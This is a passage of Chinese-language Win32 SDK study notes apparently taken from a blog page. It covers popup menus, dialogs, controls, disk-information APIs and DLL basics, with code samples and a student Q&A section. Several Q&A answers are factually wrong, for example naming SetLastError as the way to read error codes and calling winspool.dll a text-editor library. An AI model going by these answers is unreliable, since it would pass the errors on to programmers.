class="comment">//我们需要将窗口坐标转换为屏幕坐标</span></span><br><span class="line">POINT pt = &#123; dwX ,dwY &#125;;</span><br><span class="line"><span class="built_in">ClientToScreen</span>(hWnd, &amp;pt);</span><br><span class="line">    </span><br><span class="line">HMENU hMenu =  <span class="built_in">LoadMenu</span>(g_hInstance, <span class="built_in">MAKEINTRESOURCE</span>(IDR_MENU2));</span><br><span class="line">    </span><br><span class="line"><span class="comment">//获取子菜单的句柄</span></span><br><span class="line">HMENU hSubMenu = <span class="built_in">GetSubMenu</span>(</span><br><span class="line">hMenu, <span class="comment">//父级菜单句柄</span></span><br><span class="line"><span class="number">1</span>);</span><br><span class="line">    </span><br><span class="line"><span class="built_in">TrackPopupMenu</span>(</span><br><span class="line">hSubMenu,</span><br><span class="line">TPM_LEFTALIGN,</span><br><span class="line">pt.x,</span><br><span class="line">pt.y,</span><br><span class="line"><span class="number">0</span>,</span><br><span class="line">hWnd,</span><br><span class="line"><span class="literal">NULL</span></span><br><span class="line">);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><h2 id="对话框资源"><a href="#对话框资源" class="headerlink" title="对话框资源"></a>对话框资源</h2><p>可视化编程</p><ul><li>DialogBox 模态对话框 会阻塞住父窗口</li><li>CreateDialog 非模态对话框 不会阻塞父窗口</li></ul><h3 id="模态对话框"><a href="#模态对话框" class="headerlink" title="模态对话框"></a>模态对话框</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;resource.h&quot;</span></span></span><br><span class="line"><span class="function">INT_PTR CALLBACK <span class="title">DlgProc</span><span class="params">(HWND hWnd, UINT Message, WPARAM wParam, LPARAM lParam)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> WINAPI <span class="title">WinMain</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">HINSTANCE hInstance,</span></span></span><br><span class="line"><span class="params"><span class="function">HINSTANCE hPreInstance,</span></span></span><br><span class="line"><span class="params"><span class="function">LPSTR lpCmdLine,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="type">int</span> nCmdShow</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">DialogBox</span>(</span><br><span class="line">hInstance,</span><br><span class="line"><span class="built_in">MAKEINTRESOURCE</span>(IDD_DIALOG1),</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line">DlgProc</span><br><span class="line">);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="非模态对话框"><a href="#非模态对话框" class="headerlink" title="非模态对话框"></a>非模态对话框</h3><p>CreateDialog</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;resource.h&quot;</span></span></span><br><span class="line"><span class="function">INT_PTR CALLBACK <span class="title">DlgProc</span><span class="params">(HWND hWnd, UINT Message, WPARAM wParam, LPARAM lParam)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> WINAPI <span class="title">WinMain</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">HINSTANCE hInstance,</span></span></span><br><span class="line"><span class="params"><span class="function">HINSTANCE hPreInstance,</span></span></span><br><span class="line"><span class="params"><span class="function">LPSTR lpCmdLine,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="type">int</span> nCmdShow</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">HWND hDlg = <span class="built_in">CreateDialog</span>(</span><br><span class="line">hInstance,</span><br><span class="line"><span class="built_in">MAKEINTRESOURCE</span>(IDD_DIALOG1),</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line">DlgProc</span><br><span class="line">);</span><br><span class="line"><span class="comment">//显示窗口</span></span><br><span class="line"><span class="built_in">ShowWindow</span>(hDlg, SW_SHOW);</span><br><span class="line">MSG msg = &#123;&#125;;</span><br><span class="line"><span class="comment">// 消息循环</span></span><br><span class="line"><span class="keyword">while</span> (<span class="built_in">GetMessage</span>(</span><br><span class="line">&amp;msg, <span class="comment">//获取到消息的结构体</span></span><br><span class="line"><span class="number">0</span>,    <span class="comment">//获取哪一个窗口的消息，为0就是所有窗口</span></span><br><span class="line"><span class="number">0</span>,</span><br><span class="line"><span class="number">0</span>)</span><br><span class="line">)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//   5.2翻译消息</span></span><br><span class="line"><span class="built_in">TranslateMessage</span>(&amp;msg);</span><br><span class="line"><span class="comment">//   5.3转发到消息回调函数</span></span><br><span class="line"><span class="built_in">DispatchMessage</span>(&amp;msg);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="对话框控件的使用"><a href="#对话框控件的使用" class="headerlink" title="对话框控件的使用"></a>对话框控件的使用</h2><h3 id="单选框"><a href="#单选框" class="headerlink" title="单选框"></a>单选框</h3><p>有一个重要操作，需要记住：分组</p><p>ctrl+D之后将同一组的radio都编为连续的序号。</p><p>将每组的第一个radio设置group为true</p><h3 id="静态文本"><a href="#静态文本" class="headerlink" title="静态文本"></a>静态文本</h3><p>一个提示语直接拖拽即可</p><h3 id="静态图片"><a href="#静态图片" class="headerlink" title="静态图片"></a>静态图片</h3><p>能够显示一个bitmap的图片</p><p>需要一个picture的控件，然后去设置两个属性</p><p>一个bmp格式的图片资源</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//1,初始化图片</span></span><br><span class="line">HBITMAP hBit_map = <span class="built_in">LoadBitmap</span>(g_hInstance, <span class="built_in">MAKEINTRESOURCE</span>(IDB_BITMAP1));</span><br><span class="line">HWND hPic=<span class="built_in">GetDlgItem</span>(hMain, IDC_STATIC1);<span class="comment">//获取图片框资源句柄</span></span><br><span class="line"><span class="built_in">SendMessage</span>(hPic, STM_SETIMAGE, IMAGE_BITMAP, (LPARAM)hBit_map);</span><br></pre></td></tr></table></figure><h1 id="四、SDK问题"><a href="#四、SDK问题" class="headerlink" title="四、SDK问题"></a>四、SDK问题</h1><h2 id="问答1"><a href="#问答1" class="headerlink" title="问答1"></a>问答1</h2><p>1、什么是windows 错误码?应该在什么时候获取? 使用什么函数获取? 获取到之后如何<br>查看其所代表的内容?<br>答：windows 错误码是不同的API有不同类型的错误返回值，在API结束之后获取，可以使用SetLastError函数获取，使用错误查找工具或者在VS监视栏中输入“err,hr”查看。<br>2、如何为自己的函数定义windows 错误码，使用哪一个函数?<br>答：SetLastError函数。<br>3、在Virtual Stodio 中，在监视栏中输入什么字符，能够方便的查看错误码?<br>答：err,hr字符。<br>4、什么是句柄? 几个字节? 有什么用?<br>答：在程序设计中，句柄是一种特殊的智能指针。当一个应用程序要引用其他系统（如数据库、操作系统）所管理的内存块或对象时，就要使用句柄。在windows编程中，一个句柄是指使用的一个唯一的整数值，即一个4字节(64位程序中为8字节)长的数值，来标识应用程序中的不同对象和同类中的不同的实例，诸如，一个窗口，按钮，图标，滚动条，输出设备，控件或者文件等。<br>5、什么是实例? WinMain 函数的四个参数分别代表什么意思?<br>答：实例诸如一个窗口，按钮，图标，滚动条等，hInstance是程序实例的句柄，它是程序的加载地址，hPrevInstance这个参数已经废弃，IpCmdLine是由调用者传入的命令，nCmdShow是由调用者传入的int型参数。<br>6、请问TCHAR,_tcslen 本质是什么?由谁控制? 使用通用字符需要包含什么头文件?<br>答：T版的数据或者函数，本质上还是ascii编码或者unicode的编码，主要靠#indefine和typedef实现的，它只由编译环境自动选择，tchar.h头文件。<br>7、窗口回调函数的原型是什么?<br>答：原型如下：<br>LRESULT CALLBACK WindowProc(<br>HWND hwnd, //窗口句柄<br>UINT uMsg, //消息ID<br>WPARAM wParam, //消息参数1<br>LPARAM lParam //消息参数2<br>);<br>8、使用SPY++查看QQ 登录框类名是什么? 聊天窗口类名是什么?<br>答： TXGuiFoundation TXGuiFoundation<br>9、窗口类结构体中hbrBackground 有什么用? 请尽量详细的说明。<br>答：hbrBackground 可以刷新背景所用的画刷的句柄。Windows定义六种现有画刷：WHITE_BRUSH、LTGRAY_BRUSH、GRAY_BRUSH、DKGRAY_BRUSH、BLACK_BRUSH和NULL_BRUSH （也叫HOLLOW_BRUSH）。您可以将任何一种现有画刷选入您的装置内容中，就和您选择一种画笔一样。Windbws将HBRUSH定义为画刷的代号，所以可以先定义一个画刷代号变数：<br>HBRUSH hBrush ;<br>您可以通过呼叫GetStockObject来取得GRAY_BRUSH的代号：<br>hBrush = GetStockObject (GRAY_BRUSH) ;<br>wndclass.hbrBackground = (HBRUSH) GetStockObject (GRAY_BRUSH);//设置窗口背景画刷的句柄</p><p>10、什么是队列消息? 什么是非队列消息? 请各举出三个例子。<br>答：队列消息包括系统和线程的消息队列，队列送到系统消息队列，然后送到线程消息队列，而非队列消息是直接送给目的窗口的过程。队列消息如WM_MOUSERMOVE,WM_CHAR,WM_PAINT。非队列消息有WM_ACTIVATE,应用系统发送WM_WINDOWPOSCHANGED，SendMessage函数也会发送非队列消息。</p><p>11、PostMessage 和SendMessage 有什么区别?<br>答：PostMessage只是把消息放入队列，不管其他程序是否处理都返回，然后继续执行；而SendMessage必须等待其他程序处理消息后才返回，继续执行。PostMessage的返回值表示PostMessage函数执行是否正确；而SendMessage的返回值表示其他程序处理消息后的返回值。 PostMessage会造成消息的滞后性,而SendMessage则不会,但如果SendMessage消息处理失败,则会造成程序停止。</p><p>12、下面这个结构体是窗口类结构体，请分别说明，各个字段是什么含义。<br>答：各字段含义见注释。<br>typedef struct tagWNDCLASSW {<br>UINT style;//窗口类的风格（无符号32位整数）<br>WNDPROC lpfnWndProc;//指向窗口过程的指针<br>int cbClsExtra;//分派给窗口类的扩展的字节数<br>int cbWndExtra;//分派给窗口实例的扩展的字节数<br>HINSTANCE hInstance;.//实例句柄<br>HICON hIcon;//类图标的句柄<br>HCURSOR hCursor;//类鼠标指针的句柄<br>HBRUSH hbrBackground;//刷新背景所用的画刷的句柄<br>LPCWSTR lpszMenuName;//窗口类包含的菜单的名称<br>LPCWSTR lpszClassName;//窗口类名<br>}<br>WNDCLASSW</p><p>13、以下消息分别在什么时候触发<br>WM_LBUTTONDOWN 点击鼠标左键<br>WM_PAINT 绘制对象时<br>WM_CLOSE 点击关闭程序按钮</p><p>==================</p><p>1、窗口风格有三大风格，分别是什么? 各有什么特点?<br>答：窗口三大风格是重叠窗口(Overlapped Window)，弹出窗口(Popup Window)，子窗口(Child Window)，重叠窗口是顶级窗口，是缺省类型，它有边框，标题栏，客户区等，还有其他组件；弹出窗口也是顶级窗口，通常用于对话框或者Message对话框，它具有WS_POPUP窗口风格，隐含带有WS_CLIPSIBLINGS窗口风格。</p><p>2、WM_COMMAND 作为控件的通知消息，wParam 与lParam 分别有什么含义?<br>答：wParam是指32位的消息参数，是一个消息有关的常量值，也可能是窗口或控件的句柄， lParam 也是指32位的消息参数，通常是一个指向内存中数据的指针。</p><p>3、什么是模态对话框? 什么是非模态对话框? 用什么创建?，<br>答：模态对话框创建后一定要在用户关闭对话框后，其父窗口才能响应用户操作，否则父窗口便无法响应任何用户的操作，模态对话框函数自带消息循环；非模态对话框则是创建完后其父窗口不需要像模态窗口那样等到对话框关闭才能响应用户的操作，一样可以在对话框未关闭前响应用户操作，非模态对话框函数需要自己写消息循环。模态对话框使用DialogBox创建，非模态对话框使用CreateDialog完成。</p><p>4、控件既可以用代码创建，也可以在对话框资源上拖拽，创建控件的函数是什么?。<br>答：创建控件的函数是CreateWindow。</p><p>5、WM_NOTIFY 和WM_COMMAND 的区别。<br>答：WM_COMMAND和WM_NOTIFY都是控件通知消息，WM_NOTIFY和WM_COMMAND相比，是一种更灵活的消息格式，lParam中放的是一个称为NMHDR结构的指针。在wParam中放的则是控件的ID。最初Windows 3.x就有的控件，如Edit，Combo，List，Button等，发送的控件通知消息的格式是WM_COMMAND；而后期的Win32通用控件，如List View，Image List，IP Address，Tree View，Toolbar等，发送的都是WM_NOTIFY控件通知消息。</p><p>6、使用通用(扩展)控件的准备工作都有哪些？<br>答：在15版本以下的VS使用通用控件需要先包含<CommCtrl.h>,引入 #pragma comment(lib,”comct132.lib”)，调用InitCommonControls初始化通用控件，使用CreateWindowEx函数创建通用控件。</CommCtrl.h></p><p>==================<br>1、什么是API? 什么是动态链接库? 写出常见的动态链接库及其大体功能。<br>答：API是指API（Application Programming Interface，应用程序编程接口）是一些预先定义的函数，目的是提供应用程序与开发人员基于某软件或硬件得以访问一组历程的能力，而又无需访问源码，或理解内部工作机制的细节。<br>动态链接库的英文名称叫DynamicLinkableLibrary，它是microsoft在windows操作系统中实现共享函数库概念的一种实现方式。大多数与windows相关的磁盘文件如果不是程序模块，就是动态链接程序。<br>常见的动态链接库及其大体功能：<br>kernel32.dll Windows9x/Me中非常重要的32位动态链接库文件，属于内核级文件。它控制着系统的内存管理、数据的输入输出操作和中断处理<br>user32.dll Windows用户界面相关应用程序接口，用于包括Windows处理，基本用户界面等特性，如创建窗口和发送消息。<br>gdi32.dll Windows GDI图形用户界面相关程序，包含的函数用来绘制图像和显示文字<br>winspool.dll 一款文本编辑软件的库文件<br>comdlg32.dll Windows应用程序公用对话框模块，用于例如打开文件对话框</p><p>都包括什么?<br>2、你所知道的文件操作<br>答：文件操作包括新建打开文件CreateFile，删除指定文件DeleteFile，复制文件CopyFile，ReadFile读取文件，WriteFile写文件，GetFileAttribute获取文件属性，SetFileAttribute设置文件或目录的属性。</p><p>3、什么是进程? 什么是线程?<br>答：进程是资源的分配和调度的一个独立单元，而线程是CPU调度的基本单元，同一个进程中可以包括多个线程，并且线程共享整个进程的资源（寄存器、堆栈、上下文），一个进程至少包括一个线程。</p><p>4、Dll 可以导出什么?<br>答：Dll可以导出类和函数。</p><p>5、在编写dll 时，当我们想要导出一个东西时，有哪些方式? 分别如何实现?<br>答：一、可以使用_declspec(dllexport)，在函数声明前加_declspec(dllexport)。二、使用模块定义文件（扩展名为.def）导出，文件里面写<br>LIBRARY<br>DESCRIPTION “DLL”<br>EXPORTS<br>函数名</p><p>6、我们使用dll 的时候，通常有两种方式。分别如何实现?<br>答：见上一题。</p><p>7、什么叫做对象库? 什么叫做导入库?<br>答;对象库是一个扩展名为.LIB的文件，在这个文件的代码在运行链接器进行静态链接时被添加到程序的.EXE文件中。导入库是一种特殊的形式的对象库文件，后缀名和对象库一样，链接器用它来解析源代码中的函数调用。但是导入库不包含任何代码，它们只给链接器提供信息来建立EXE文件中用于动态链接的重定位表格。</p><p>8、什么叫做名称粉碎? 有什么用处?<br>答：名称粉碎是函数名称相同的函数在C中出现重定义，然而在C++中用于函数重载，相同的名称会粉碎成不同的函数内存地址，从而区别调用的是什么函数，由此可以实现多态。</p><h2 id="问答2"><a href="#问答2" class="headerlink" title="问答2"></a>问答2</h2><ol><li><p>怎么将”123”转换成123? 反过来呢?</p><p>使用sscanf_s函数将字符转换位数字，宽版使用stscanf_s</p><p>反过来就是先转换为数字后，反向遍历</p><p>（老师批注：stscanf_s是通用版本，根据项目默认编码方式自动匹配，wsprintf是宽版，用到通用版本才需要tchar，单纯用宽版函数是不需要tchar.h的）</p></li><li><p>“哈哈”和L”哈哈”一样吗? 哪里不一样? 怎么转换?</p><p>答：不一样，窄版和宽版，如果需要使用宽板只需在字符前加上L即可，但需包含头文件tchar.h</p></li><li><p>创建窗口的流程是什么?</p><p>1,使用WNDCLASS结构体定义窗口</p><p>2，将定义的窗口注册</p><p>3，将注册的窗口创建出来</p><p>4，更新并显示窗口</p><p>5，创建消息循环</p><p>6，回调</p></li><li><p>怎么响应窗口消息?</p><p>答：不同的消息有不同的响应方式，例如：当窗口创建的时候会产生WM_CREATE消息，点击按钮（button）时会产生WM_COMMAND消息，</p></li><li><p>wParam和lParam保存了什么信息?</p><p>答：如在响应WM_COMMAND消息时WPARAM的高位是通知码，低位是ID，LPARAM保存的是句柄</p></li><li><p>怎么响应控件的单击消息?</p><p>答：单击控件时会产生WM_COMMAND消息，在这个消息中他的WPARAM的低位是被单机控件的ID，把这个ID找出来后，通过这个ID使用GetDlgItem这个函数获取该控件的句柄从而进行想要的消息响应</p></li><li><p>如何创建单选框?</p><p>在工具栏中拖拽，然后通过WPARAM的低位ID响应，然后通过WPARAM的高位通知码获取单选框是否被点击</p></li><li><p>怎么将单选框设置为选中状态?</p><p>答：给单选框发送一个SendMessage消息第二参数BM_SETCHECK第三个参数就是设置选中的状态码1</p></li><li><p>如何获取复选框是否被选中?</p><p>使用BM_GETCHECK参数给复选框发送SendMessage消息，用BOOL值接收</p></li><li><p>如何给窗口添加主菜单?</p><p>答：资源创建，通过ID获取句柄，创建窗口时加上这个句柄</p></li><li><p>怎么在程序中加载图片资源?</p><p>答：</p><p>//加载图片</p><p>HBITMAP hBit_map = LoadBitmap(g_hInstance, MAKEINTRESOURCE(IDB_BITMAP1));</p><p>//获取图片框资源句柄</p><p>HWND hPic=GetDlgItem(hMain, IDC_STATIC1);</p><p>//设置图片</p><p>SendMessage(hPic, STM_SETIMAGE, IMAGE_BITMAP, (LPARAM)hBit_map);</p></li><li><p>怎么在窗口中弹出右键菜单</p><p>在WM_RBUTTONDOWN消息中响应右击，在这个消息中获取右击的坐标，使用这个坐标弹出窗口（TrackPopupMeun）</p></li><li><p>怎么设置和获取编辑框的文本</p><p>获取编辑框句柄GetDlgItem</p><p>创建接收文本的缓冲区WCHAR 数组</p><p>获取编辑款文本GetWindowText</p></li><li><p>下拉框怎么添加文本?</p><p>获取句柄在使用ComboBox_AddString函数添加文本</p></li><li><p>怎么结束一个对话框?</p><p>EndDiaLog</p></li><li><p>怎么获取或修改窗口的窗口风格?</p><p>获取需要修改控件的句柄，然后使用SetClassLong修改</p></li><li><p>怎么替换一个控件的消息回调函数?</p><p> 控件句柄 修改的属性 回调函数</p><p>SetWindowLong(hButton1, GWL_WNDPROC, (LONG)ButtonProc);</p></li><li><p>怎么创建DLL工程?</p><p>在新建的时候选择dll，</p></li><li><p>怎么导出函数?</p><p>两种导出方法</p><p>在头文件中声明导出_declspec(dllexport)</p><p>模块定义导出，添加一个def文件，在文件中写入EXPORTS（后跟需要导出的函数，且函数后标号）</p><p>之后再属性配置里–&gt;连接器–&gt;输入，中有一个模块定义文件，把这个选项值写成.def文件全称（xxx.def）</p></li><li><p>怎么调用从DLL导出的函数?</p><p>两种调用方式</p><p>隐式调用</p><p>包含头文件，头文件中含有导出函数的声明。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">载入lib文件  #pragma  comment（lib,“”）;</span><br><span class="line">直接调用函数即可</span><br></pre></td></tr></table></figure><p>显示调用</p><p>使用LoadLibrary（）将目标dll强行加载到进程中。<br>在 GetProcAddress()获得函数的地址。然后使用返回的函数指针调用</p><p>（老师批注：dll显式链接方式不要忘了FreeLibrary）</p></li><li><p>怎么调试DLL</p><p>（老师批注：可以通过编写调用dll函数的程序进行调试）</p></li><li><p>exe加载DLL时(使用相对路径),被加载的DLL可以放在任何目录吗,如果不能,那么都能放到哪些目录?</p><p>只能放在相对exe的相对路径中</p></li><li><p>怎么使用静态库? 和动态库相比有和区别?</p><p>使用方法是一样的，只是使用静态库编译后的程序会比动态库的程序占用空间大，因为静态库是直接把库文件载入到了程序中，而不是需要从外部调用</p></li></ol><h1 id="五、磁盘信息"><a href="#五、磁盘信息" class="headerlink" title="五、磁盘信息"></a>五、磁盘信息</h1><h2 id="获取盘符的字符串，"><a href="#获取盘符的字符串，" class="headerlink" title="获取盘符的字符串，"></a>获取盘符的字符串，</h2><p>GetLogicalDriveStrings( 100,buf);</p><p>// 把语言设置为中文</p><p>setlocale(LC_ALL, “chs”);</p><h2 id="获取驱动器类型"><a href="#获取驱动器类型" class="headerlink" title="获取驱动器类型"></a>获取驱动器类型</h2><p>，由于这里需要的是一个指针，所以需要在定义一个TCHAR*指针类型指向数组（缓冲区）</p><p>用整形接收返回值，</p><p> 2，代表可移动设备 DRIVE_REMOVABLE</p><p> 3，硬盘 DRIVE_FIXED</p><p> 4，远程设备DRIVE_REMOTE</p><p> 5，光驱 DRIVE_CDROM</p><p>GetDriveType(pTemp);</p><h2 id="计算磁盘空间"><a href="#计算磁盘空间" class="headerlink" title="计算磁盘空间"></a>计算磁盘空间</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">GetDiskFreeSpace</span>(pTemp,<span class="comment">//盘符</span></span><br><span class="line">&amp;每簇的扇区数量, </span><br><span class="line">&amp;每个扇区的容量, </span><br><span class="line">&amp;空闲簇的总量,   </span><br><span class="line">&amp;全部簇的总量 </span><br></pre></td></tr></table></figure><h2 id="查看磁盘的实例代码"><a href="#查看磁盘的实例代码" class="headerlink" title="查看磁盘的实例代码"></a>查看磁盘的实例代码</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 02_获取磁盘信息.cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//1. 获取驱动器名称</span></span><br><span class="line">TCHAR buf[<span class="number">100</span>] = &#123;&#125;;</span><br><span class="line">TCHAR* pTemp = buf;</span><br><span class="line"><span class="built_in">GetLogicalDriveStrings</span>( <span class="number">100</span>,buf);</span><br><span class="line"><span class="comment">// 把语言设置为中文</span></span><br><span class="line"><span class="built_in">setlocale</span>(LC_ALL, <span class="string">&quot;chs&quot;</span>);</span><br><span class="line"><span class="keyword">while</span> (pTemp[<span class="number">0</span>]!=<span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="built_in">wprintf</span>(_T(<span class="string">&quot;%s  &quot;</span>), pTemp);</span><br><span class="line"><span class="comment">//2. 获取驱动器类型</span></span><br><span class="line">DWORD dwType = <span class="built_in">GetDriveType</span>(pTemp);</span><br><span class="line"><span class="keyword">switch</span> (dwType)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> DRIVE_REMOVABLE:</span><br><span class="line"><span class="built_in">wprintf</span>(_T(<span class="string">&quot;可移动设备 &quot;</span>));</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> DRIVE_FIXED:</span><br><span class="line"><span class="built_in">wprintf</span>(_T(<span class="string">&quot;硬盘 &quot;</span>));</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> DRIVE_REMOTE:</span><br><span class="line"><span class="built_in">wprintf</span>(_T(<span class="string">&quot;远程设备 &quot;</span>));</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> DRIVE_CDROM:</span><br><span class="line"><span class="built_in">wprintf</span>(_T(<span class="string">&quot;光驱 &quot;</span>));</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//3. 驱动器的空间信息</span></span><br><span class="line">DWORD 每簇的扇区数量 = <span class="number">0</span>;</span><br><span class="line">DWORD 每个扇区的容量 = <span class="number">0</span>;</span><br><span class="line">DWORD 空闲簇的总量 = <span class="number">0</span>;</span><br><span class="line">DWORD 全部簇的总量 = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">GetDiskFreeSpace</span>(pTemp,</span><br><span class="line">&amp;每簇的扇区数量, </span><br><span class="line">&amp;每个扇区的容量, </span><br><span class="line">&amp;空闲簇的总量,   </span><br><span class="line">&amp;全部簇的总量     </span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;总容量为%.2lf,空闲容量为%.2lf&quot;</span>,</span><br><span class="line">(((全部簇的总量/<span class="number">1024.0</span>) * 每簇的扇区数量 * 每个扇区的容量)/<span class="number">1024</span>)/<span class="number">1024</span>,</span><br><span class="line">(((空闲簇的总量/<span class="number">1024.0</span>) * 每簇的扇区数量 * 每个扇区的容量) / <span class="number">1024</span>) / <span class="number">1024</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">pTemp += <span class="built_in">wcslen</span>(buf)+<span class="number">1</span>;</span><br><span class="line">        <span class="comment">/*wcslen遇到0会被截断，缓冲区存储的时“C:\0D:\”,所以wcslen(buf)的长度等于3，pTemp+=wcslen(buf)+1之后就是下一个盘符的开始*/</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="六、动态链接库"><a href="#六、动态链接库" class="headerlink" title="六、动态链接库"></a>六、动态链接库</h1><p>定义 DLL 应用程序的入口点</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// dllmain.cpp : </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;framework.h&quot;</span></span></span><br><span class="line"><span class="comment">//dll文件是给他人提供函数所用，不会作为一个程序单独运行，也就没有第一行执行代码的概念</span></span><br><span class="line"><span class="comment">//通常不需要理会DllMain，不会再里面写什么代码</span></span><br><span 